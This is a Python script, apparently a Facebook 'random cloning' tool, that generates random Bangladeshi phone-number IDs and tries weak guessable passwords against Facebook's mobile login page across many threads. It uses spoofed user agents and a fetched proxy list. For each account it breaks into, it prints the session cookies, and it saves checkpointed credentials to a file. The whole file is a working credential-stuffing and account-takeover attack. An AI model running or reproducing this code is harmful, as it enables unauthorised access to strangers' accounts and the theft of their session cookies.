
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]

ugen = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5669.73 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5326.82 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5479.49 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5903.48 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4777.63 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.3011.34 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4336.91 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5565.86 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.4342.48 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.3242.85 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3495.98 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5260.45 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4573.22 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5046.74 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.3767.91 Mobile Safari/537.36"]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.3275.69 Mobile Safari/537.36"]
ugen =["Mozilla/5.0 (Windows NT 10.0; 11; Windows NT 10.0N50G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4520.72 Chrome/109.0.0.0 Safari/537.36"]
cokbrut=[]
ses=requests.Session()
princp=[]
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	alhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhaj)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    alhaj=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(alhaj)

import os
import os
os.system('espeak -a 300 " PKG INSTALL. ESPEAK"')
os.system("pkg install espeak")

os.system('espeak -a 300 " P  I   P INSTALL REQUESTS "')
os.system("pip install requests")
os.system("clear")
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	alhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhaj)
os.system("xdg-open https://www.facebook.com/profile.php?id=100093466325198:/")
# LOGO
logo = ("""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                           ___   _   _ _____ _____ _   _ 
          
  /
 
 /$$$$$$$      /$$$$$$      /$$$$$$$      /$$   /$$
| $$__  $$    /$$__  $$    | $$__  $$    | $$  /$$/
| $$  \ $$   | $$  \ $$    | $$  \ $$    | $$ /$$/ 
| $$  | $$   | $$$$$$$$    | $$$$$$$/    | $$$$$/  
| $$  | $$   | $$__  $$    | $$__  $$    | $$  $$  
| $$  | $$   | $$  | $$    | $$  \ $$    | $$\  $$ 
| $$$$$$$//$$| $$  | $$ /$$| $$  | $$ /$$| $$ \  $$
|_______/|__/|__/  |__/|__/|__/  |__/|__/|__/  \__/
                                                                                                                                                                                                                                                                                                                                                          
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING MOBILE DATA AND WIFI ALSO ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                 • \33[1;38mMd Hasib ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK             :  Md Hasib ]   ║  \033[1;97m  
╠══[GITHUB                  • \33[1;38mMd-Hasib-Dark ]   ║\33[1;34m   
╠══[REGIONAL             • BANGLADESH ]               ║\33[1;35m 
╠══[TOOLS                    •   Random clone                                       ║ \33[1;32m   
╠══[VERSION                 • 0.2 ]                      ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")  
# MAIN MANU 
def Main():
        os.system("clear")
        print(logo)
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32mRANDOM HACK BD")
        print(" \033[1;35m[\033[1;32m2\033[1;35m] \033[1;32mCONTACT ADMIN")
        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31mEXIT")
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Alhaj =input("\n \033[1;35m[😁\033[1;35m] \033[1;32mSELECTED YOUR OPTION : ")
        if Alhaj in ["1","01"]:
            sexy()
        if Alhaj in ["2","02"]:
        	os.system('xdg-open t.me/.me/+8801707064105')
        if Alhaj in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    user=[]
    os.system('clear')
    print(logo)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32m[😅\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m016\033[1;32m]\033[1;35m [\033[1;32m017\033[1;35m] \033[1;33m[\033[1;34m018\033[1;33m] \033[1;34m[\033[1;33m019\033[1;34m]')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input('\033[1;33m[😭\033[1;32m]\033[1;32m YOUR SIM CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32m[😁\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m3000\033[1;32m]\033[1;35m [\033[1;32m5000\033[1;35m] \033[1;33m[\033[1;34m10000\033[1;33m] ')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('\033[1;33m[😍\033[1;32m]\033[1;32m YOUR LIMITED : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print('\033[1;33m[😁\033[1;33m] \033[1;36mYOUR TOTAL IDS : \033[1;32m'+tl)
        print("\033[1;33m[😁\033[1;33m] \033[1;36mYOUR SIM CODE :\033[1;32m "+code)
        print('\033[1;33m[😁\033[1;33m]\033[1;35m PLEASE WAIT CLONING START')
        print('\033[1;33m[😁\033[1;33m] \033[1;34mUSE FLIGHT MODE ON/OF FOR SPEED UP')
        print('\033[1;33m[😁\033[1;33m] \033[1;35mSUPER FAST SPEED CLONING')
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(alh4aj,uid,pwx,tl)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK Dark-OK.txt')
    print(' [😁] CP Dark-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;32m[Dark-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    # =[ UA = PRO ]= #
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'viewport-width': '980',}
            o = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#______𝑶𝑲-𝑰𝑵-𝑭𝑹𝑶👇👇👇👇                
                print(f"""❴\033[38;5;46m𝙊𝙆 𝙄𝘿_❵]
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎❴\033[38;5;46m𝙇𝙄𝙏𝙀+𝙇𝙊𝙂𝙄𝙉❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     The Dark𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     The Dark𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mDark-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/DarkCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
# END #
